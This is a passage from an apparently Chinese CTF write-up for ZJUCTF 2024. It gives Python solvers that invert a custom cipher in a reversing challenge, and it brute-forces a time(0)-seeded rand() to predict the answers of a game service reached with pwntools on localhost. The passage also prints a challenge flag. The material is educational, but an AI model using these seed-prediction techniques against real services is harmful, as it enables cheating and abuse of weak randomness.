<li>放到ida里一看，甚至还没有去符号表，一道简单的逆向题目，rand种子也有了，那么rand结果都是确定的: <img src="/img/zjuctf2024/21.png" srcset="/img/loading.gif" lazyload></li>
<li>把每个函数逆向一下，再整个逆向，连起来就好了，就是有点烦: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python">sbox = [<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <br><span class="hljs-number">0x57</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x93</span>, <br><span class="hljs-number">0x45</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x65</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xCE</span>, <br><span class="hljs-number">0x3E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE1</span>, <br><span class="hljs-number">0x39</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD6</span>, <br><span class="hljs-number">0x51</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xCC</span>, <br><span class="hljs-number">0xB0</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x99</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB7</span>, <br><span class="hljs-number">0xA9</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xDE</span>, <br><span class="hljs-number">0x1B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x22</span>, <br><span class="hljs-number">0xFE</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x08</span>, <br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x7D</span>, <br><span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0x64</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDB</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x83</span>, <br><span class="hljs-number">0x02</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x7F</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x3B</span>, <br><span class="hljs-number">0x81</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x79</span>, <br><span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xB6</span>, <br><span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x71</span>, <br><span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x72</span>, <br><span class="hljs-number">0x07</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2A</span>, <br><span class="hljs-number">0x68</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBB</span>, <br><span class="hljs-number">0xC9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x80</span>, <br><span class="hljs-number">0x9E</span><br>]<br>ans = [<br><span class="hljs-number">0xE6</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xF7</span>, <br><span class="hljs-number">0x71</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x13</span>, <br><span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x82</span><br>]<br>rand = []<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;random_numbers.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rand.append(<span class="hljs-built_in">int</span>(i))<br><span class="hljs-comment"># print(rand)</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sbox)==<span class="hljs-number">256</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ans)==<span class="hljs-number">28</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b2w</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">4</span>):<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> lis[i:i+<span class="hljs-number">4</span>][::-<span class="hljs-number">1</span>]:<br>            tmp = tmp*<span class="hljs-number">256</span>+j<br>        newlis.append(tmp)<br>    <span class="hljs-keyword">return</span> newlis<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= randnum<br>        randnum = (randnum+<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= (randnum+i*<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc1(func1(testflaglis,rand[<span class="hljs-number">0</span>]),rand[<span class="hljs-number">0</span>])==testflaglis<br><br>testflaglis = func1(testflaglis,rand[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &gt;&gt; bits) | (value &lt;&lt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &lt;&lt; bits) | (value &gt;&gt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">7</span>)-index<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32(flaglis[i],<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">12</span>)<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32((flaglis[i]+index),<span class="hljs-number">7</span>)<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc2(func2(testflaglis,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>)==testflaglis<br><br>testflaglis = func2(testflaglis,<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w2b</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            newlis.append(lis[i]%<span class="hljs-number">256</span>)<br>            lis[i] = lis[i]&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> newlis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findsbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        tmp.append(sbox[i])<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfindbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        <span class="hljs-comment"># print(i,tmp)</span><br>        tmp.append(sbox.index(i))<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfindbox(findsbox(testflaglis)))<br><span class="hljs-keyword">assert</span> revfindbox(findsbox(testflaglis))==testflaglis<br><br>testflaglis = findsbox(testflaglis)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    flaglis = b2w(tmp)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfunc3(func3(testflaglis)))<br><span class="hljs-keyword">assert</span> revfunc3(func3(testflaglis))==testflaglis<br><br><span class="hljs-built_in">print</span>()<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whole</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        flaglis = func1(flaglis,rand[i])<br>        flaglis = func2(flaglis,i)<br>        flaglis = findsbox(flaglis)<br>        flaglis = func3(flaglis)<br>    flaglis = func1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revwhole</span>(<span class="hljs-params">flaglis</span>):<br>    flaglis = revfunc1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        flaglis = revfunc3(flaglis)<br>        flaglis = revfindbox(flaglis)<br>        flaglis = revfunc2(flaglis,i)<br>        flaglis = revfunc1(flaglis,rand[i])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-built_in">print</span>(revwhole(whole(testflaglis)))<br><span class="hljs-built_in">print</span>()<br><br>flaglis = b2w(ans)<br>flaglis = w2b(revwhole(flaglis))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment"># ZJUCTF&#123;s0_EaSy_2_gE7_@n$W3R&#125;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="中a口算">中A口算</h2>
<ul>
<li><p>放到ida里查看，发现随机数是用time(0)随机种子获取的，然后可以一次性输入0x1000个答案，由于每次check都会sleep一秒，因此只要随机数撞库，发三次0x1000个答案，超过10086分就可以拿下: <img src="/img/zjuctf2024/23.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>但是实际上用ctype撞库并不成功，然后看到大A口算提示，可能系统时间被修改成很久以前，于是爆破，花了一个小时不到就撞出来了，大概是2010年: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63610</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>rand1,rand2 = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[:-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;?&quot;</span>)]<br><span class="hljs-built_in">print</span>(rand1,rand2)<br>libc = ctypes.CDLL(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>temp = libc.time(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(temp)):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/24.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>最后加上offset就能得到flag了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">offset = <span class="hljs-number">1729249263</span>-<span class="hljs-number">1287399664</span><br>realtime = temp - offset<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(realtime-<span class="hljs-number">60</span>,realtime+<span class="hljs-number">60</span>):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>(<span class="hljs-params">time,<span class="hljs-built_in">len</span></span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    libc.srand(time)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>):<br>        tmp1 = libc.rand()<br>        tmp2 = libc.rand()<br>        testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>        testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>        <span class="hljs-keyword">if</span> testrand1&gt;testrand2:<br>            ans+=<span class="hljs-string">&quot;&gt;&quot;</span><br>        <span class="hljs-keyword">elif</span> testrand1==testrand2:<br>            ans+=<span class="hljs-string">&quot;=&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            ans+=<span class="hljs-string">&quot;&lt;&quot;</span><br>    <span class="hljs-keyword">return</span> ans<br><br>io.recv()<br>ans = getans(i,<span class="hljs-number">0x1000</span>*<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    io.send(ans[i*<span class="hljs-number">0x1000</span>:i*<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x1000</span>])<br>    time.sleep(<span class="hljs-number">1</span>)<br>    io.recv()<br>io.send(<span class="hljs-string">b&quot;submit&quot;</span>)<br>io.interactive()<br><br><span class="hljs-comment"># 